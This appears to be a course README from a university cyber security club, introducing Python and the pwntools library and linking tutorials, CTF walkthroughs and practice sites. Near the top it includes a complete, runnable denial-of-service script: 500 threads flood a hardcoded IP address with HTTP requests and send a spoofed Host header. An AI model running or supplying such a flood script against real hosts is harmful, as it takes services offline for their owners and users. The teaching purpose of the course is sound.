# Section-2 (Python) 🐍

Welcome to the second section of LS: Tools for Cyber Security :) </br>
This week we will be covering Python along with one of its very powerful library **pwntools**.
<p align="center">
<img src="https://user-images.githubusercontent.com/81357954/153569492-a10ef6ad-3e2a-45ed-bb46-8758eae71cbf.png" alt="drawing" width="400"/>
</p>

**Why it is called Python [:)?](https://docs.python.org/3/faq/general.html#:~:text=Details%20here.-,Why%20is%20it%20called%20Python%3F,to%20call%20the%20language%20Python.)** </br>

[**Python**](https://en.wikipedia.org/wiki/Python_(programming_language)) is an [interpreted](https://www.ibm.com/docs/en/zos-basic-skills?topic=zos-compiled-versus-interpreted-languages) general-purpose programming language. It is one of the most popular and widely-used programming languages in the world due to its high usability and large collection of libraries. 
Again Python is an open source software like Linux. So you can look up its source code [here](https://github.com/python/cpython), though you are not encouraged to read them 🦖.

Is Python itself written in C or C++? [An interesting read](https://softwareengineering.stackexchange.com/questions/20988/why-is-python-written-in-c-and-not-in-c) on this.
Unlike C or C++, Python has [automatic memory management](https://www.geeksforgeeks.org/memory-management-in-python/) i.e. in Python memory allocation and deallocation method is automatic, since it has its own garbage collector, so that the user does not have to do manual garbage collection. Python is a [dynamically typed](https://www.geeksforgeeks.org/type-systemsdynamic-typing-static-typing-duck-typing/) programming language which makes it more succint. 

We prefer Python in cyber security, because complex scripts or attacks can be easily written in it. It helps to automate tasks across the cyberattack life cycle for both cyber attackers and defenders. Also, debugging python codes is quite simple.

``` python
import socket
import threading
target = '103.21.127.134'
fake_ip = '182.21.20.32'
port = 80
def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()
for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
```
<p align="center">
  Snippet of a simple <a href ="https://en.wikipedia.org/wiki/Denial-of-service_attack">DoS attack</a> script in python. 
</p>


## Installation
We are not taking up `how to install python`. Since it is available by default on Linux. Also, just a google search away :).</br>
[Here](http://docs.pwntools.com/en/latest/install.html) is the link to install `pwntools`. Though it comes pre installed on the VM we have provided.

## Overview
This week's content includes an introduction to Python(syntax and such stuff). These resources will make you comfortable with python.</br>
Followed by an introduction to [pwntools](http://docs.pwntools.com/en/latest/), an interesting framework. `Pwntools` in itself is a huge package and even a dedicated module would be less to know everything about it. It will get you familiar with writing exploit scripts in Python.</br>
Some other important modules/libraries regularly used are [sys](https://docs.python.org/3/library/sys.html), [os](https://docs.python.org/3/library/os.html), [subprocess](https://docs.python.org/3/library/subprocess.html), all these are in-built python modules.

## Our Introductory Session for Python

[CSeC - Intro to Python](https://iitbacin.sharepoint.com/:v:/s/CSecClub/ETXm3oSRRoJKgKDCaKLiRbYBTh5fLAYkaow3MX59-5FTyQ?e=1rRkWg) | [Colab Notebook link](https://colab.research.google.com/drive/1jtco0kzb9pg7eAPUEh4VEAP8k7Iq1J3P?usp=sharing)

Credits to [scimaths](https://github.com/scimaths) 🙏
## Text guides

1. [Pico Primer(python + other basics)](https://primer.picoctf.com/#_programming_in_python)
2. [Intro to Python](http://introtopython.org/) (You may skip classes)
3. [Pwntools Cheat Sheet](https://gist.github.com/anvbis/64907e4f90974c4bdd930baeb705dedf)

## Video guides
- Another brief learn python [playlist](https://www.youtube.com/playlist?list=PLQVvvaa0QuDeAams7fkdcwOGBpGdHpXln) (The first 8 videos (85 mins) of the playlist are enough to get you going, you may skip the remaining videos :)


## CTF challenge Walkthroughs
1. string evaluation of input in python2 [HSCTF - Python Remote Code Execution ](https://www.youtube.com/watch?v=gmaWOknsb2A) (5 min) | Read more about Python2.x [input vulnerability](https://www.geeksforgeeks.org/vulnerability-input-function-python-2-x/)
1. pwntools process interaction [GOOGLE CTF 2021](https://www.proggen.org/doku.php?id=security:ctf:writeup:google:2021:filestore) (good read)
2. pwntools in bash [TAMU CTF 2020](https://www.youtube.com/watch?v=fZ3mPRctbO0) (17 mins)
3. Request module usage [OverTheWire natas level4](https://www.youtube.com/watch?v=Sf63W1xXzNU) (11  mins)
4. Pyjail  [Offshift 2021](https://www.youtube.com/watch?v=aK3b0PM1Fz8) (6 mins)

## Practice
- [PicoGym](https://play.picoctf.org/practice) (Filter challenges by **General Skills**)


Discussions among mentees are encouraged and we request you to use the corresponding Team on MS Teams or the corresponding WhatsApp group for the same.
<p align="center">Created with :heart: by <a href="https://cseciitb.github.io/">CSeC</a></p>
